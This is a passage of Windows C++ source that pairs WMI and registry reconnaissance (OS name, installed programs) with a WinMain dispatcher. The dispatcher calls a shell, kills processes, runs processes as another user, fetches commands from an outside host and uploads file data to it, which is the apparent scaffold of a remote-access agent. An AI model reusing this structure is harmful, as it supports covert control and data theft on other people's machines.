			<< hex << hres << endl;
		CoUninitialize();
		return 1;                 // Program has failed.
	}

	// Step 4: -----------------------------------------------------
	// Connect to WMI through the IWbemLocator::ConnectServer method

	IWbemServices *pSvc = NULL;

	// Connect to the root\cimv2 namespace with
	// the current user and obtain pointer pSvc
	// to make IWbemServices calls.
	hres = pLoc->ConnectServer(
		_bstr_t(L"ROOT\\CIMV2"), // Object path of WMI namespace
		NULL,                    // User name. NULL = current user
		NULL,                    // User password. NULL = current
		0,                       // Locale. NULL indicates current
		NULL,                    // Security flags.
		0,                       // Authority (for example, Kerberos)
		0,                       // Context object 
		&pSvc                    // pointer to IWbemServices proxy
	);

	if (FAILED(hres))
	{
		cout << "Could not connect. Error code = 0x"
			<< hex << hres << endl;
		pLoc->Release();
		CoUninitialize();
		return 1;                // Program has failed.
	}

	cout << "Connected to ROOT\\CIMV2 WMI namespace" << endl;


	// Step 5: --------------------------------------------------
	// Set security levels on the proxy -------------------------

	hres = CoSetProxyBlanket(
		pSvc,                        // Indicates the proxy to set
		RPC_C_AUTHN_WINNT,           // RPC_C_AUTHN_xxx
		RPC_C_AUTHZ_NONE,            // RPC_C_AUTHZ_xxx
		NULL,                        // Server principal name 
		RPC_C_AUTHN_LEVEL_CALL,      // RPC_C_AUTHN_LEVEL_xxx 
		RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx
		NULL,                        // client identity
		EOAC_NONE                    // proxy capabilities 
	);

	if (FAILED(hres))
	{
		cout << "Could not set proxy blanket. Error code = 0x"
			<< hex << hres << endl;
		pSvc->Release();
		pLoc->Release();
		CoUninitialize();
		return 1;               // Program has failed.
	}

	// Step 6: --------------------------------------------------
	// Use the IWbemServices pointer to make requests of WMI ----

	// For example, get the name of the operating system
	IEnumWbemClassObject* pEnumerator = NULL;
	hres = pSvc->ExecQuery(
		bstr_t("WQL"),
		bstr_t("SELECT * FROM Win32_OperatingSystem"),
		WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
		NULL,
		&pEnumerator);

	if (FAILED(hres))
	{
		cout << "Query for operating system name failed."
			<< " Error code = 0x"
			<< hex << hres << endl;
		pSvc->Release();
		pLoc->Release();
		CoUninitialize();
		return 1;               // Program has failed.
	}

	// Step 7: -------------------------------------------------
	// Get the data from the query in step 6 -------------------

	IWbemClassObject *pclsObj = NULL;
	ULONG uReturn = 0;

	while (pEnumerator)
	{
		HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1,
			&pclsObj, &uReturn);

		if (0 == uReturn)
		{
			break;
		}

		VARIANT vtProp;

		VariantInit(&vtProp);
		// Get the value of the Name property
		hr = pclsObj->Get(L"Name", 0, &vtProp, 0, 0);
		wcout << " OS Name : " << vtProp.bstrVal << endl;
		VariantClear(&vtProp);

		pclsObj->Release();
	}

	// Cleanup
	// ========

	pSvc->Release();
	pLoc->Release();
	pEnumerator->Release();
	CoUninitialize();

	return 0;   // Program successfully completed.

}

#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383


// Gets registry keys under hKey
void QueryKey(HKEY hKey)
{
	TCHAR    achKey[MAX_KEY_LENGTH];   // buffer for subkey name
	DWORD    cbName;                   // size of name string 
	TCHAR    achClass[MAX_PATH] = TEXT("");  // buffer for class name 
	DWORD    cchClassName = MAX_PATH;  // size of class string 
	DWORD    cSubKeys = 0;               // number of subkeys 
	DWORD    cbMaxSubKey;              // longest subkey size 
	DWORD    cchMaxClass;              // longest class string 
	DWORD    cValues;              // number of values for key 
	DWORD    cchMaxValue;          // longest value name 
	DWORD    cbMaxValueData;       // longest value data 
	DWORD    cbSecurityDescriptor; // size of security descriptor 
	FILETIME ftLastWriteTime;      // last write time 

	DWORD i, retCode;

	TCHAR  achValue[MAX_VALUE_NAME];
	DWORD cchValue = MAX_VALUE_NAME;

	// Get the class name and the value count. 
	retCode = RegQueryInfoKey(
		hKey,                    // key handle 
		achClass,                // buffer for class name 
		&cchClassName,           // size of class string 
		NULL,                    // reserved 
		&cSubKeys,               // number of subkeys 
		&cbMaxSubKey,            // longest subkey size 
		&cchMaxClass,            // longest class string 
		&cValues,                // number of values for this key 
		&cchMaxValue,            // longest value name 
		&cbMaxValueData,         // longest value data 
		&cbSecurityDescriptor,   // security descriptor 
		&ftLastWriteTime);       // last write time 

								 // Enumerate the subkeys, until RegEnumKeyEx fails.

	if (cSubKeys)
	{
		for (i = 0; i<cSubKeys; i++)
		{
			cbName = MAX_KEY_LENGTH;
			retCode = RegEnumKeyEx(hKey, i,
				achKey,
				&cbName,
				NULL,
				NULL,
				NULL,
				&ftLastWriteTime);
			if (retCode == ERROR_SUCCESS)
			{
				//				printf("%s\n", achKey);

				char key[512] = { 0 };
				char data[512] = { 0 };
				int size = 512;
				HKEY hTestKey;

				sprintf(key, "%s%s", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\", achKey);
				strcat(key, "\\");

				if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
					key,
					0,
					KEY_READ,
					&hTestKey) == ERROR_SUCCESS
					)
				{
					QueryKey(hTestKey);
				}
			}
		}
	}

	// Enumerate the key values. 

	if (cValues)
	{
		char data[512] = { 0 };
		int size = 512;

		for (i = 0, retCode = ERROR_SUCCESS; i<cValues; i++)
		{
			DWORD type = 0;
			cchValue = MAX_VALUE_NAME;
			achValue[0] = '\0';
			retCode = RegEnumValue(hKey, i,
				achValue,
				&cchValue,
				NULL,
				&type,
				(LPBYTE)data,
				(LPDWORD)&size);

			if (retCode == ERROR_SUCCESS && type == REG_SZ)
			{
				if (strstr(achValue, "DisplayName") != 0)
					printf("\t%s: %s\n", achValue, data);
			}
			else if (retCode == ERROR_SUCCESS && type == REG_DWORD)
			{
				//				printf("\t%s: %d\n", achValue, *((int *)data));
			}
		}
	}
}

// Get list of installed applications on windows box from registry
void ListInstalled()
{
	HKEY hTestKey;

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\"),
		0,
		KEY_READ,
		&hTestKey) == ERROR_SUCCESS
		)
	{
		QueryKey(hTestKey);
	}

	RegCloseKey(hTestKey);
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR     lpCmdLine,        int       nShowCmd)
{
	int command = 3;

	int process = 1;
	int pid = 9999;

	char *cmdline = "notepad.exe";

	RedirectIOToConsole(1);

	switch (command)
	{
	case 0:
		start_shell();
		break;
	case 1:
		if (process)
			list_process_or_service(true);
		else
			list_process_or_service(false);
		break;
	case 2:
		kill_process(pid, 0);
		break;
	case 3:
//		getf();
		http_get("www.awright2009.com", "/terminal.html", "User-Agent: Mozilla/5.0\r\n\r\n");
		break;
	case 4:
	{
		char data[4096];
		int length = 0;

		http_put("www.awright2009.com", "/file.html", "User-Agent: Mozilla/5.0\r\n\r\n", data, length);
//		putf();
		//thread_get_put_file
		break;
	}
	case 5:
		if (process)
			create_process_nonblocking(cmdline);
		else
			start_service(cmdline);
		break;
	case 6:
		whoami();
		break;
	case 7:

	case 8:
	case 9:
		pidrun();// start process as user
		break;
	case 10:
		geturl();
		break;
	case 11:
		break;
	case 12:
		break;
	}

	return 0;
}

